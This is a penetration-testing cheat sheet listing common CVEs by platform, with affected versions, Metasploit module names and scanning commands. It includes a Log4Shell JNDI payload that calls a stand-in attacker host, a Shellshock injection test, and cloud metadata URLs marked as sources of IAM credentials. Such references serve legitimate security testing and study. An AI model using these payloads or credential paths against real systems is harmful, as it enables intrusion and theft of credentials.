# Common CVEs for Penetration Testing

## Windows

### MS17-010 (EternalBlue)
- **CVE**: CVE-2017-0144
- **Affected**: Windows XP - Server 2016
- **Service**: SMB (445)
- **Impact**: Remote Code Execution
- **Exploit**: `exploit/windows/smb/ms17_010_eternalblue`

### PrintNightmare
- **CVE**: CVE-2021-34527, CVE-2021-1675
- **Affected**: All Windows versions
- **Service**: Print Spooler
- **Impact**: Remote/Local Code Execution, Privilege Escalation
- **Tools**: CVE-2021-1675.py, PrintSpoofer

### Zerologon
- **CVE**: CVE-2020-1472
- **Affected**: Windows Server 2008-2019
- **Service**: Netlogon (RPC)
- **Impact**: Domain compromise (set DC password to empty)
- **Tools**: zerologon_tester.py, secretsdump.py

### BlueKeep
- **CVE**: CVE-2019-0708
- **Affected**: Windows XP - Server 2008 R2
- **Service**: RDP (3389)
- **Impact**: Remote Code Execution
- **Exploit**: `exploit/windows/rdp/cve_2019_0708_bluekeep_rce`

### SMBGhost
- **CVE**: CVE-2020-0796
- **Affected**: Windows 10 1903/1909, Server 2019 1903/1909
- **Service**: SMBv3 (445)
- **Impact**: Remote Code Execution

### HiveNightmare / SeriousSAM
- **CVE**: CVE-2021-36934
- **Affected**: Windows 10 1809+
- **Impact**: SAM database access (local privilege escalation)

### ProxyLogon
- **CVE**: CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065
- **Affected**: Exchange Server 2013-2019
- **Impact**: SSRF to RCE

### ProxyShell
- **CVE**: CVE-2021-34473, CVE-2021-34523, CVE-2021-31207
- **Affected**: Exchange Server 2013-2019
- **Impact**: Pre-auth RCE

---

## Linux

### Dirty COW
- **CVE**: CVE-2016-5195
- **Affected**: Linux kernel 2.6.22 - 4.8.3
- **Impact**: Local privilege escalation
- **Exploit**: Multiple PoCs available

### Dirty Pipe
- **CVE**: CVE-2022-0847
- **Affected**: Linux kernel 5.8+
- **Impact**: Local privilege escalation
- **Exploit**: Write to any readable file

### PwnKit
- **CVE**: CVE-2021-4034
- **Affected**: Polkit (most Linux distros)
- **Impact**: Local privilege escalation to root

### Sudo Baron Samedit
- **CVE**: CVE-2021-3156
- **Affected**: Sudo 1.8.2-1.9.5p1
- **Impact**: Local privilege escalation to root

### Shellshock
- **CVE**: CVE-2014-6271
- **Affected**: Bash < 4.3
- **Impact**: Remote Code Execution (via CGI, etc.)
- **Test**: `env x='() { :;}; echo vulnerable' bash -c "echo test"`

---

## Web Applications

### Log4Shell
- **CVE**: CVE-2021-44228
- **Affected**: Apache Log4j 2.0-2.14.1
- **Impact**: Remote Code Execution
- **Payload**: `${jndi:ldap://attacker.com/exploit}`

### Apache Struts
- **CVE**: CVE-2017-5638
- **Affected**: Apache Struts 2.3.5-2.3.31, 2.5-2.5.10
- **Impact**: Remote Code Execution

### Spring4Shell
- **CVE**: CVE-2022-22965
- **Affected**: Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19
- **Impact**: Remote Code Execution

### Apache Path Traversal
- **CVE**: CVE-2021-41773, CVE-2021-42013
- **Affected**: Apache 2.4.49, 2.4.50
- **Impact**: Path traversal, RCE (with mod_cgi)

---

## Network Devices

### Citrix NetScaler ADC
- **CVE**: CVE-2019-19781
- **Impact**: Path traversal to RCE

### Pulse Secure VPN
- **CVE**: CVE-2019-11510
- **Impact**: Arbitrary file read (credentials)

### F5 BIG-IP
- **CVE**: CVE-2020-5902
- **Impact**: Remote Code Execution (TMUI)

### Fortinet FortiOS
- **CVE**: CVE-2018-13379
- **Impact**: Path traversal (credential disclosure)

---

## Databases

### MySQL UDF
- User Defined Functions for privilege escalation

### PostgreSQL
- Large object functions for file read/write
- COPY TO PROGRAM for RCE

### Redis
- Unauthenticated access leads to RCE via cron, SSH keys, or modules

### MongoDB
- Default no authentication
- CVE-2013-4650 for older versions

---

## Cloud

### AWS IMDS
- http://169.254.169.254/latest/meta-data/
- Instance metadata, IAM credentials

### Azure IMDS
- http://169.254.169.254/metadata/instance
- Requires `Metadata: true` header

### GCP Metadata
- http://metadata.google.internal/computeMetadata/v1/
- Requires `Metadata-Flavor: Google` header

---

## Checking for CVEs

### Nmap
```bash
nmap --script vuln TARGET
nmap --script smb-vuln* TARGET
```

### SearchSploit
```bash
searchsploit apache 2.4
searchsploit -m 12345  # Mirror exploit
```

### Nuclei
```bash
nuclei -u http://target.com -t cves/
```

### Metasploit
```bash
search type:exploit cve:2021
```
